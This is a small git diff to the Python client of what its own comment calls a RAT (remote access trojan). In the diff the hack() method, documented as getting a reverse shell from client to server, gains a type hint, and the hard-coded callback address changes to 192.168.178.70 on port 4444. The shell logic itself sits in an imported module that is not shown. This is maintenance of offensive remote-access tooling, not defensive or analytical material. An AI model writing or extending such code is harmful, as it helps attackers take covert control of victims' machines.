@@ -1,3 +1,4 @@
+from types import NoneType
 from client.connection import Connection
 from client.rev_shell import Shell
 import time
@@ -20,7 +21,8 @@ class Client:
         self.host = host
         self.port = port
 
-    def hack(self):
+
+    def hack(self) -> None:
         '''
         Creates a connection between server and client.
         Gets a reverse shell from client to server
@@ -49,4 +51,4 @@ class Client:
     
 if __name__ == "__main__":
     # Run RAT with specified IP and port
-    Client("192.168.178.69", 4444).hack()
+    Client("192.168.178.70", 4444).hack()
